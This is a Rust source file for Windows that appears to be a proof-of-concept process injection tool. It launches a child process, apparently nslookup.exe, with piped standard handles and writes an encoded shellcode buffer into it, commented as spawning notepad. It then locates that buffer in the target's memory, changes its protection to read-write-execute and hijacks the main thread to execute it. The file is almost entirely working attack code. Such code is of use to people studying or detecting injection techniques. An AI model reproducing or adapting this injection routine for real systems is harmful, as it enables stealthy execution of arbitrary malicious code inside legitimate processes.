mod utils;

use std::ffi::{CString, c_void};
use std::{ptr, thread, time::Duration};

use crate::utils::{
    Handle, MemoryInfo, change_protect, create_pipe, find_offset, get_args, hijack_main_thread,
};

use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::Storage::FileSystem::{ReadFile, WriteFile};
use windows::Win32::System::IO::OVERLAPPED;
use windows::Win32::System::Threading::{
    CREATE_NEW_CONSOLE, CreateProcessA, NORMAL_PRIORITY_CLASS, PROCESS_INFORMATION,
    STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOA,
};
use windows::core::{PCSTR, PSTR};

fn main() {
    // get path to executable
    let result: CString = get_args().unwrap();
    let path: *mut u8 = result.as_ptr() as *mut u8;
    let cmd_line: PSTR = PSTR::from_raw(path);

    // get handle of hStdInput / hStdOuput
    let my_handle: Handle = create_pipe();

    // fill startup info
    let reserved: PSTR = PSTR::null();

    // send handler to the new created process
    let si: STARTUPINFOA = STARTUPINFOA {
        cb: std::mem::size_of::<STARTUPINFOA>() as u32,
        lpReserved: reserved,
        dwFlags: STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
        hStdInput: my_handle.h_std_in_read,
        hStdOutput: my_handle.h_std_out_write,
        hStdError: my_handle.h_std_out_write,
        ..Default::default()
    };

    // prepare arg for CreateProcess
    let mut pi: PROCESS_INFORMATION = PROCESS_INFORMATION {
        ..Default::default()
    };
    let app_name: PCSTR = PCSTR::null();
    let env: *const c_void = ptr::null();
    let curr_directory: PCSTR = PCSTR::null();
    let sa: Option<*const SECURITY_ATTRIBUTES> =
        Some(&my_handle.sa as *const SECURITY_ATTRIBUTES);

    let result = unsafe {
        CreateProcessA(
            app_name,
            Some(cmd_line),
            sa,
            sa,
            true,
            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
            Some(env),
            curr_directory,
            &si,
            &mut pi,
        )
    };

    // close unuse handle
    match result {
        Ok(()) => {
            println!("[+] Process create Successfully !");
            let _ = unsafe { CloseHandle(my_handle.h_std_in_read) };
            let _ = unsafe { CloseHandle(my_handle.h_std_out_write) };
            thread::sleep(Duration::from_secs(2));
        }
        Err(e) => println!("[-] Process creation failed: {e}"),
    };

    // send bytes pattern + payload (spawn notepad)
    let buffer: [u8; 342] = [
        0x61, 0x62, 0x63, 0x61, 0x62, 0x63, 0x61, 0x62, 0x63, 0x61, 0x62, 0x63, 0x61, 0x62, 0x63,
        0x48, 0xbf, 0xe4, 0x67, 0xcd, 0x22, 0x71, 0x6a, 0xd1, 0xa7, 0x48, 0x89, 0xe3, 0x66, 0x81,
        0xe3, 0xe0, 0xf8, 0xd9, 0xce, 0x4d, 0x31, 0xe4, 0x41, 0xb4, 0x23, 0x48, 0x0f, 0xae, 0x03,
        0x4c, 0x8b, 0x7b, 0x08, 0x49, 0xff, 0xcc, 0x4b, 0x31, 0x7c, 0xe7, 0x1d, 0x4d, 0x85, 0xe4,
        0x75, 0xf3, 0x18, 0x2f, 0x4e, 0xc6, 0x81, 0x82, 0x11, 0xa7, 0xe4, 0x67, 0x8c, 0x73, 0x30,
        0x3a, 0x83, 0xf6, 0xb2, 0x2f, 0xfc, 0xf0, 0x14, 0x22, 0x5a, 0xf5, 0x84, 0x2f, 0x46, 0x70,
        0x69, 0x22, 0x5a, 0xf5, 0xc4, 0x2f, 0x46, 0x50, 0x21, 0x22, 0xde, 0x10, 0xae, 0x2d, 0x80,
        0x13, 0xb8, 0x22, 0xe0, 0x67, 0x48, 0x5b, 0xac, 0x5e, 0x73, 0x46, 0xf1, 0xe6, 0x25, 0xae,
        0xc0, 0x63, 0x70, 0xab, 0x33, 0x4a, 0xb6, 0x26, 0x9c, 0x6a, 0xfa, 0x38, 0xf1, 0x2c, 0xa6,
        0x5b, 0x85, 0x23, 0xa1, 0xe1, 0x51, 0x2f, 0xe4, 0x67, 0xcd, 0x6a, 0xf4, 0xaa, 0xa5, 0xc0,
        0xac, 0x66, 0x1d, 0x72, 0xfa, 0x22, 0xc9, 0xe3, 0x6f, 0x27, 0xed, 0x6b, 0x70, 0xba, 0x32,
        0xf1, 0xac, 0x98, 0x04, 0x63, 0xfa, 0x5e, 0x59, 0xef, 0xe5, 0xb1, 0x80, 0x13, 0xb8, 0x22,
        0xe0, 0x67, 0x48, 0x26, 0x0c, 0xeb, 0x7c, 0x2b, 0xd0, 0x66, 0xdc, 0x87, 0xb8, 0xd3, 0x3d,
        0x69, 0x9d, 0x83, 0xec, 0x22, 0xf4, 0xf3, 0x04, 0xb2, 0x89, 0xe3, 0x6f, 0x27, 0xe9, 0x6b,
        0x70, 0xba, 0xb7, 0xe6, 0x6f, 0x6b, 0x85, 0x66, 0xfa, 0x2a, 0xcd, 0xee, 0xe5, 0xb7, 0x8c,
        0xa9, 0x75, 0xe2, 0x99, 0xa6, 0x34, 0x26, 0x95, 0x63, 0x29, 0x34, 0x88, 0xfd, 0xa5, 0x3f,
        0x8c, 0x7b, 0x30, 0x30, 0x99, 0x24, 0x08, 0x47, 0x8c, 0x70, 0x8e, 0x8a, 0x89, 0xe6, 0xbd,
        0x3d, 0x85, 0xa9, 0x63, 0x83, 0x86, 0x58, 0x1b, 0x98, 0x90, 0x6a, 0xcb, 0x6b, 0xd1, 0xa7,
        0xe4, 0x67, 0xcd, 0x22, 0x71, 0x22, 0x5c, 0x2a, 0xe5, 0x66, 0xcd, 0x22, 0x30, 0xd0, 0xe0,
        0x2c, 0x8b, 0xe0, 0x32, 0xf7, 0xca, 0x9a, 0x64, 0x05, 0xb2, 0x26, 0x77, 0x84, 0xe4, 0xd7,
        0x4c, 0x58, 0x31, 0x2f, 0x4e, 0xe6, 0x59, 0x56, 0xd7, 0xdb, 0xee, 0xe7, 0x36, 0xc2, 0x04,
        0x6f, 0x6a, 0xe0, 0xf7, 0x15, 0xa2, 0x48, 0x71, 0x33, 0x90, 0x2e, 0x3e, 0x98, 0x18, 0x4c,
        0x1e, 0x1e, 0xb4, 0xd7, 0x85, 0x03, 0xe3, 0x47, 0x09, 0x0f, 0xd1, 0xef,
    ];

    let mut byte_written: u32 = 0;
    let mut overlapped: OVERLAPPED = OVERLAPPED {
        ..Default::default()
    };

    // send payload throught pipe
    let result = unsafe {
        //lpnumberofbytewritten w/o coercion, lpoverlapped w/ coercion
        WriteFile(
            my_handle.h_std_in_write,
            Some(&buffer),
            Some(&mut byte_written as *mut u32),
            Some(&mut overlapped),
        )
    };

    match result {
        Ok(()) => println!(
            "[+] Successfully write 342 bytes into process:{:?}",
            byte_written
        ),
        Err(e) => println!("[-] Error while writing in process: {e}"),
    };

    let mut buffer_out: [u8; 512] = [0; 512];
    let mut byte_read: u32 = 0;

    // recieve data from pipe
    let result = unsafe {
        ReadFile(
            my_handle.h_std_out_read,
            Some(&mut buffer_out),
            Some(&mut byte_read),
            Some(&mut overlapped),
        )
    };

    match result {
        Ok(_) => {
            println!("[+] Bytes recieved: {:?}", byte_read);
        }
        Err(e) => println!("[-] Error while recieved: {e}"),
    }

    // find where the payload is store in process memory
    let ns_handle: HANDLE = pi.hProcess;
    let result: Option<MemoryInfo> = find_offset(ns_handle, &buffer);

    let mem_info: MemoryInfo = result.unwrap_or_default();

    // change protection to RWX in the region that contain the payload
    change_protect(ns_handle, &mem_info);

    // try to hijack main thread
    let ns_thread: HANDLE = pi.hThread;
    let offset: u64 = mem_info.payload_addr as u64;
    hijack_main_thread(ns_thread, offset);

    byte_written = 0;
    let mut overlapped: OVERLAPPED = OVERLAPPED {
        ..Default::default()
    };
    let input: &[u8; 1] = b"\n";

    // this write is use to unblock the main thread of nslookup.exe
    let _ = unsafe {
        WriteFile(
            my_handle.h_std_in_write,
            Some(input),
            Some(&mut byte_written),
            Some(&mut overlapped),
        )
    };
    println!("[*] Triggered ReadFile with {} bytes", byte_written);

    // clean the handle
    unsafe {
        let _ = CloseHandle(my_handle.h_std_in_write);
        let _ = CloseHandle(my_handle.h_std_out_read);
        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);
    };
}
